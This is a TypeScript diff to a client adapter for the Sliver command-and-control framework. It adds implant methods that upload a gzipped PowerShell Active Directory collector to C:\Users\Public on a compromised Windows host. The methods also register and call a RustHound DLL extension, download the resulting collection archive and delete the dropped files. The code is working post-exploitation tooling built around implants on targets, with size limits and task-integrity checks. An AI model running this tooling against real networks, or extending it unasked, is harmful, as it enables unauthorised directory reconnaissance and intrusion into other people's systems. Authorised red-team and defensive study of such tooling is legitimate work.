@@ -8,6 +8,7 @@ import {
   type clientpb,
 } from "sliver-script";
 import { createHash } from "node:crypto";
+import { gzipSync } from "node:zlib";
 import type { SessionRegistryHive } from "../shared/session-contracts.js";
 
 /**
@@ -165,6 +166,8 @@ export type SliverClientAdapter = Pick<
   Exclude<SliverClientMethod, "connect"> | "event$" | "eventStreamState$"
 > & {
   connect(): Promise<unknown>;
+  /** Whether the SDK can register and retrieve bounded native extensions on its artifact channel. */
+  readonly nativeExtensionArtifactTransportAvailable: boolean;
   /** Server inventory only; does not query or operate an individual target. */
   getPivotGraph?(): Promise<clientpb.PivotGraph>;
   getExternalBuilders?(): Promise<clientpb.Builders>;
@@ -179,6 +182,14 @@ export type SliverClientAdapter = Pick<
   mountBeacon(beaconId: string, timeoutSeconds: number): Promise<sliverpb.Mount>;
   memfilesBeacon(beaconId: string, timeoutSeconds: number): Promise<sliverpb.Ls>;
   catBeacon(beaconId: string, path: string, timeoutSeconds: number): Promise<sliverpb.Download>;
+  /** Queues one explicitly selected, bounded PowerShell AD collector file. */
+  uploadAdCollectionBeacon(beaconId: string, path: string, script: Buffer, timeoutSeconds: number): Promise<sliverpb.Upload>;
+  /** Queues removal of only a generated AD collection path, never a beacon. */
+  rmAdCollectionBeacon(beaconId: string, path: string, timeoutSeconds: number): Promise<sliverpb.Rm>;
+  /** Queue one bounded AD collection file download; response is an async task acknowledgement. */
+  downloadAdCollectionBeacon(beaconId: string, path: string, maxBytes: number, timeoutSeconds: number): Promise<sliverpb.Download>;
+  /** Fetch one capped AD collection DownloadReq task through the public control RPC. */
+  fetchAdCollectionBeaconTask(taskId: string, timeoutSeconds: number): Promise<clientpb.BeaconTask>;
   headBeacon(beaconId: string, path: string, options: BeaconTextSliceOptions, timeoutSeconds: number): Promise<sliverpb.Download>;
   tailBeacon(beaconId: string, path: string, options: BeaconTextSliceOptions, timeoutSeconds: number): Promise<sliverpb.Download>;
   grepBeacon(beaconId: string, options: BeaconGrepOptions, timeoutSeconds: number): Promise<sliverpb.Grep>;
@@ -205,6 +216,14 @@ export type SliverClientAdapter = Pick<
   /** Calls only that registered loader with a main-packed BOF envelope. */
   callLegacyBofSession(sessionId: string, loader: Buffer, argumentsBuffer: Buffer, exportName: string, timeoutSeconds: number): Promise<sliverpb.CallExtension>;
   callLegacyBofBeacon(beaconId: string, loader: Buffer, argumentsBuffer: Buffer, exportName: string, timeoutSeconds: number): Promise<sliverpb.CallExtension>;
+  /** Registers the fixed Windows RustHound DLL from main-owned Armory bytes. */
+  registerAdCollectorSession(sessionId: string, extension: Buffer, timeoutSeconds: number): Promise<sliverpb.RegisterExtension>;
+  registerAdCollectorBeacon(beaconId: string, extension: Buffer, timeoutSeconds: number): Promise<sliverpb.RegisterExtension>;
+  /** Calls one fixed RustHound export; args and callback output are framed JSON. */
+  callAdCollectorSession(sessionId: string, extensionName: string, args: Buffer, timeoutSeconds: number): Promise<sliverpb.CallExtension>;
+  callAdCollectorBeacon(beaconId: string, extensionName: string, args: Buffer, timeoutSeconds: number): Promise<sliverpb.CallExtension>;
+  /** Fetches one exact extension task, including the large registration request. */
+  fetchAdCollectorBeaconTask(beaconId: string, taskId: string, kind: "register" | "call", extensionName: string, timeoutSeconds: number): Promise<clientpb.BeaconTask>;
 };
 
 export type SliverClientFactory = (config: SliverClientConfig) => SliverClientAdapter;
@@ -265,8 +284,13 @@ export const BEACON_TASK_CONTENT_RESPONSE_MAX_BYTES = BEACON_TASK_CONTENT_MAX_BY
 export const BOF_TASK_REQUEST_MAX_BYTES = BEACON_TASK_CONTENT_REQUEST_MAX_BYTES;
 export const BOF_TASK_RESPONSE_MAX_BYTES = 4 * 1024 * 1024;
 export const BOF_TASK_CONTENT_MAX_BYTES = BEACON_TASK_CONTENT_MAX_BYTES;
+const AD_EXTENSION_MAX_BYTES = 32 * 1024 * 1024;
+const AD_EXTENSION_ARGS_MAX_BYTES = 16 * 1024;
+const AD_EXTENSION_TASK_RESPONSE_MAX_BYTES = 128 * 1024;
+const AD_EXTENSION_EXPORT = "RustHoundCE";
 const TASK_ID = /^[A-Za-z0-9_-]{1,128}$/u;
 const TASK_DESCRIPTION = /^[A-Za-z][A-Za-z0-9_]{0,255}$/u;
+const AD_COLLECTION_REMOTE_PATH = /^C:\\Users\\Public\\(?:sliver-ad-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\.ps1|\d{14}_sliver-ad-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\.zip)$/iu;
 const REGISTRY_VALUE_MAX_BYTES = 4 * 1024 * 1024;
 const REGISTRY_HIVES = new Set<SessionRegistryHive>(["HKCU", "HKLM", "HKCR", "HKU", "HKCC"]);
 
@@ -282,6 +306,14 @@ function beaconTaskRequest(beaconId: string, timeoutSeconds: number) {
 function checkedPath(path: string): string {
   if (typeof path !== "string" || path.length === 0 || path.length > 4_096 || path.includes("\0")) {
     throw new Error("Invalid beacon file path");
+  }
+  return path;
+}
+
+function checkedAdCollectionPath(path: string, scriptOnly = false): string {
+  if (typeof path !== "string" || !AD_COLLECTION_REMOTE_PATH.test(path) ||
+      (scriptOnly && !path.toLowerCase().endsWith(".ps1"))) {
+    throw new Error("Invalid generated AD collection path");
   }
   return path;
 }
@@ -397,6 +429,41 @@ function verifyBofTaskContent(
   throw new Error("The BOF task content did not match the bounded request");
 }
 
+function verifyAdCollectorTaskContent(
+  task: clientpb.BeaconTask, beaconId: string, taskId: string, kind: "register" | "call", extensionName: string,
+): clientpb.BeaconTask {
+  const description = kind === "register" ? "RegisterExtensionReq" : "CallExtensionReq";
+  const requestLimit = kind === "register" ? AD_EXTENSION_MAX_BYTES + 1024 : AD_EXTENSION_ARGS_MAX_BYTES + 1024;
+  if (task.ID === taskId && task.BeaconID === beaconId && task.Description === description &&
+      isByteArray(task.Request) && isByteArray(task.Response) &&
+      task.Request.length <= requestLimit && task.Response.length <= AD_EXTENSION_TASK_RESPONSE_MAX_BYTES) {
+    try {
+      const request = sliverpb.Envelope.decode(task.Request).Data;
+      const name = kind === "register"
+        ? sliverpb.RegisterExtensionReq.decode(request).Name
+        : sliverpb.CallExtensionReq.decode(request).Name;
+      if (name === extensionName) return task;
+    } catch {
+      // Reject malformed or mismatched task requests below.
+    }
+  }
+  if (isByteArray(task.Request)) task.Request.fill(0);
+  if (isByteArray(task.Response)) task.Response.fill(0);
+  throw new Error("The AD collector task content did not match the bounded request");
+}
+
+interface NativeExtensionArtifactSdk {
+  registerNativeExtensionSession?: (sessionId: string, extension: {
+    name: string; data: Buffer; os: "windows"; init?: string;
+  }, timeoutSeconds: number) => Promise<sliverpb.RegisterExtension>;
+  registerNativeExtensionBeacon?: (beaconId: string, extension: {
+    name: string; data: Buffer; os: "windows"; init?: string;
+  }, timeoutSeconds: number) => Promise<sliverpb.RegisterExtension>;
+  fetchNativeExtensionRegistrationTask?: (
+    beaconId: string, taskId: string, expectedExtensionName: string, timeoutSeconds: number,
+  ) => Promise<clientpb.BeaconTask>;
+}
+
 function verifyBeaconTaskContent(
   task: clientpb.BeaconTask,
   beaconId: string,
@@ -418,7 +485,12 @@ function verifyBeaconTaskContent(
  * `interactBeacon` deliberately remains outside SliverClientAdapter.
  */
 export function adaptSliverClient(client: SliverClient): SliverClientAdapter {
+  const native = client as SliverClient & NativeExtensionArtifactSdk;
   return Object.assign(client, {
+    nativeExtensionArtifactTransportAvailable:
+      typeof native.registerNativeExtensionSession === "function" &&
+      typeof native.registerNativeExtensionBeacon === "function" &&
+      typeof native.fetchNativeExtensionRegistrationTask === "function",
     getPivotGraph: () => withTimeoutSignal(10, (signal) => client.rpc.pivotGraph({}, { signal })),
     getExternalBuilders: () => withTimeoutSignal(10, (signal) => client.rpc.builders({}, { signal })),
     getCrackstations: () => withTimeoutSignal(10, (signal) => client.rpc.crackstations({}, { signal })),
@@ -477,6 +549,57 @@ export function adaptSliverClient(client: SliverClient): SliverClientAdapter {
         MaxLines: "0",
         Request: beaconTaskRequest(beaconId, timeoutSeconds),
       }, { signal })),
+    uploadAdCollectionBeacon: async (beaconId: string, path: string, script: Buffer, timeoutSeconds: number) => {
+      if (!Buffer.isBuffer(script) || !script.length || script.length > 4 * 1024 * 1024) {
+        throw new Error("Invalid PowerShell AD collector size");
+      }
+      const payload = gzipSync(script);
+      try {
+        return await withTimeoutSignal(timeoutSeconds, (signal) => client.rpc.upload({
+          Path: checkedAdCollectionPath(path, true),
+          Encoder: "gzip",
+          Data: payload,
+          IsIOC: false,
+          FileName: "",
+          IsDirectory: false,
+          Overwrite: false,
+          Request: beaconTaskRequest(beaconId, timeoutSeconds),
+        }, { signal }));
+      } finally { payload.fill(0); }
+    },
+    rmAdCollectionBeacon: (beaconId: string, path: string, timeoutSeconds: number) =>
+      withTimeoutSignal(timeoutSeconds, (signal) => client.rpc.rm({
+        Path: checkedAdCollectionPath(path), Recursive: false, Force: true,
+        Request: beaconTaskRequest(beaconId, timeoutSeconds),
+      }, { signal })),
+    downloadAdCollectionBeacon: (beaconId: string, path: string, maxBytes: number, timeoutSeconds: number) => {
+      if (!Number.isSafeInteger(maxBytes) || maxBytes !== 12 * 1024 * 1024 + 1) {
+        throw new Error("Invalid AD collection download limit");
+      }
+      return withTimeoutSignal(timeoutSeconds, (signal) => client.rpc.download({
+        Path: checkedPath(path),
+        Start: "0",
+        Stop: "0",
+        RestrictedToFile: true,
+        Recurse: false,
+        MaxBytes: String(maxBytes),
+        MaxLines: "0",
+        Request: beaconTaskRequest(beaconId, timeoutSeconds),
+      }, { signal }));
+    },
+    fetchAdCollectionBeaconTask: async (taskId: string, timeoutSeconds: number) => {
+      if (!TASK_ID.test(taskId)) throw new Error("Invalid AD collection task ID");
+      const task = await withTimeoutSignal(timeoutSeconds, (signal) =>
+        client.rpc.getBeaconTaskContent({ ID: taskId }, { signal }));
+      // The public SDK exposes task content on the 16 MiB control channel.
+      // This fetch is only for one capped DownloadReq, never assembly content.
+      if (task.Request.length > 4096 || task.Response.length > 15 * 1024 * 1024) {
+        task.Request.fill(0);
+        task.Response.fill(0);
+        throw new Error("AD collection task exceeds its bounded response limit");
+      }
+      return task;
+    },
     headBeacon: (beaconId: string, path: string, options: BeaconTextSliceOptions, timeoutSeconds: number) => {
       const slice = beaconTextSlice(options, false);
       return withTimeoutSignal(timeoutSeconds, (signal) => client.rpc.download({
@@ -660,6 +783,61 @@ export function adaptSliverClient(client: SliverClient): SliverClientAdapter {
         ServerStore: false,
         Request: { Async: true, Timeout: timeoutSecondsToNanoseconds(timeoutSeconds), SessionID: "", BeaconID: beaconId },
       }, { signal })),
+    registerAdCollectorSession: (sessionId: string, extension: Buffer, timeoutSeconds: number) => {
+      if (!Buffer.isBuffer(extension) || !extension.length || extension.length > AD_EXTENSION_MAX_BYTES) {
+        throw new Error("Invalid bounded AD collector DLL");
+      }
+      const native = client as SliverClient & NativeExtensionArtifactSdk;
+      if (!native.registerNativeExtensionSession) throw new Error("The Sliver client SDK lacks native extension artifact transport");
+      return native.registerNativeExtensionSession(sessionId, {
+        name: createHash("sha256").update(extension).digest("hex"), data: extension, os: "windows", init: "",
+      }, timeoutSeconds);
+    },
+    registerAdCollectorBeacon: (beaconId: string, extension: Buffer, timeoutSeconds: number) => {
+      if (!Buffer.isBuffer(extension) || !extension.length || extension.length > AD_EXTENSION_MAX_BYTES) {
+        throw new Error("Invalid bounded AD collector DLL");
+      }
+      const native = client as SliverClient & NativeExtensionArtifactSdk;
+      if (!native.registerNativeExtensionBeacon) throw new Error("The Sliver client SDK lacks native extension artifact transport");
+      return native.registerNativeExtensionBeacon(beaconId, {
+        name: createHash("sha256").update(extension).digest("hex"), data: extension, os: "windows", init: "",
+      }, timeoutSeconds);
+    },
+    callAdCollectorSession: (sessionId: string, extensionName: string, args: Buffer, timeoutSeconds: number) => {
+      if (!/^[a-f0-9]{64}$/u.test(extensionName) || !Buffer.isBuffer(args) || !args.length || args.length > AD_EXTENSION_ARGS_MAX_BYTES) {
+        throw new Error("Invalid bounded AD collector request");
+      }
+      return withTimeoutSignal(timeoutSeconds, (signal) => client.rpc.callExtension({
+        Name: extensionName, BOFData: Buffer.alloc(0), Args: args, Export: AD_EXTENSION_EXPORT,
+        IsBOF: false, WantBOFOutputs: false, ServerStore: false,
+        Request: { Async: false, Timeout: timeoutSecondsToNanoseconds(timeoutSeconds), SessionID: sessionId, BeaconID: "" },
+      }, { signal }));
+    },
+    callAdCollectorBeacon: (beaconId: string, extensionName: string, args: Buffer, timeoutSeconds: number) => {
+      if (!/^[a-f0-9]{64}$/u.test(extensionName) || !Buffer.isBuffer(args) || !args.length || args.length > AD_EXTENSION_ARGS_MAX_BYTES) {
+        throw new Error("Invalid bounded AD collector request");
+      }
+      return withTimeoutSignal(timeoutSeconds, (signal) => client.rpc.callExtension({
+        Name: extensionName, BOFData: Buffer.alloc(0), Args: args, Export: AD_EXTENSION_EXPORT,
+        IsBOF: false, WantBOFOutputs: false, ServerStore: false,
+        Request: { Async: true, Timeout: timeoutSecondsToNanoseconds(timeoutSeconds), SessionID: "", BeaconID: beaconId },
+      }, { signal }));
+    },
+    fetchAdCollectorBeaconTask: async (beaconId: string, taskId: string, kind: "register" | "call", extensionName: string, timeoutSeconds: number) => {
+      if (!TASK_ID.test(beaconId) || !TASK_ID.test(taskId) || !/^[a-f0-9]{64}$/u.test(extensionName) ||
+          (kind !== "register" && kind !== "call")) {
+        throw new Error("Invalid AD collector task identity");
+      }
+      if (kind === "register") {
+        const native = client as SliverClient & NativeExtensionArtifactSdk;
+        if (!native.fetchNativeExtensionRegistrationTask) throw new Error("The Sliver client SDK lacks native extension artifact transport");
+        const task = await native.fetchNativeExtensionRegistrationTask(beaconId, taskId, extensionName, timeoutSeconds);
+        return verifyAdCollectorTaskContent(task, beaconId, taskId, kind, extensionName);
+      }
+      const task = await withTimeoutSignal(timeoutSeconds, (signal) =>
+        client.rpc.getBeaconTaskContent({ ID: taskId }, { signal }));
+      return verifyAdCollectorTaskContent(task, beaconId, taskId, kind, extensionName);
+    },
   });
 }
 
